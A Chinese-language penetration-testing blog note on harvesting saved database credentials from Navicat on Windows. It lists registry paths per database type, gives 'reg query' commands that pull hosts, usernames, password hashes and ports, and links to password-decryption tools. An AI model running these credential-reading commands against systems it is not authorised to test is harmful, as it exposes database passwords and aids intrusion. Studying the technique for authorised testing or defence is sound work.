# 内网渗透-Windows凭据收集之数据库凭据(8)

  
  
&lt;!--more--&gt;  
## 目录  
### Navicat存储各类数据库的路径  
```  
MySQL HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Servers\  
MariaDB HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMARIADB\Servers\  
MongoDB HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMONGODB\Servers\  
Microsoft SQL HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers\  
Oracle HKEY_CURRENT_USER\Software\PremiumSoft\NavicatOra\Servers\  
PostgreSQL HKEY_CURRENT_USER\Software\PremiumSoft\NavicatPG\Servers\  
SQLite HKEY_CURRENT_USER\Software\PremiumSoft\NavicatSQLite\Servers\  
```  
### 查询Mysql信息\[默认3306端口\]  
```  
reg query HKEY_CURRENT_USER\SOFTWARE\PremiumSoft\Navicat\Servers /s /v host 数据库连接ip  
reg query HKEY_CURRENT_USER\SOFTWARE\PremiumSoft\Navicat\Servers /s /v UserName 数据库用户名  
reg query HKEY_CURRENT_USER\SOFTWARE\PremiumSoft\Navicat\Servers /s /v pwd 密码hash  
reg query HKEY_CURRENT_USER\SOFTWARE\PremiumSoft\Navicat\Servers /s /v Port 数据库连接端口  
```  
### 查询Mssql信息\[默认1433端口\]  
```  
reg query HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers /s /v host  
reg query HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers /s /v UserName  
reg query HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers /s /v pwd  
reg query HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers /s /v Port  
```  
### 查询MariaDb信息\[默认3306端口\]  
```  
reg query HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMARIADB\Servers /s /v host  
reg query HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMARIADB\Servers /s /v UserName  
reg query HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMARIADB\Servers /s /v pwd  
reg query HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMARIADB\Servers /s /v Port  
```  
### 查询Oracle信息\[默认1521端口\]  
```  
reg query HKEY_CURRENT_USER\Software\PremiumSoft\NavicatOra\Servers /s /v host  
reg query HKEY_CURRENT_USER\Software\PremiumSoft\NavicatOra\Servers /s /v UserName  
reg query HKEY_CURRENT_USER\Software\PremiumSoft\NavicatOra\Servers /s /v pwd  
reg query HKEY_CURRENT_USER\Software\PremiumSoft\NavicatOra\Servers /s /v Port  
```  
### 查询PostgreSQL信息\[默认5432端口\]  
```  
reg query HKEY_CURRENT_USER\Software\PremiumSoft\NavicatPG\Servers /s /v host  
reg query HKEY_CURRENT_USER\Software\PremiumSoft\NavicatPG\Servers /s /v UserName  
reg query HKEY_CURRENT_USER\Software\PremiumSoft\NavicatPG\Servers /s /v pwd  
reg query HKEY_CURRENT_USER\Software\PremiumSoft\NavicatPG\Servers /s /v Port  
```  
### 查询MongoDB信息\[默认27017端口\]  
```  
reg query HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMONGODB\Servers /s /v host  
reg query HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMONGODB\Servers /s /v UserName  
reg query HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMONGODB\Servers /s /v pwd  
reg query HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMONGODB\Servers /s /v Port  
```  
  
  
## 工具  
https://github.com/pxss/navicatpwd  
https://github.com/HyperSine/how-does-navicat-encrypt-password/tree/master/python3  
  

---

> Author: N1Rvana  
> URL: http://localhost:1313/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-windows%E5%87%AD%E6%8D%AE%E6%94%B6%E9%9B%86%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%87%AD%E6%8D%AE8/  

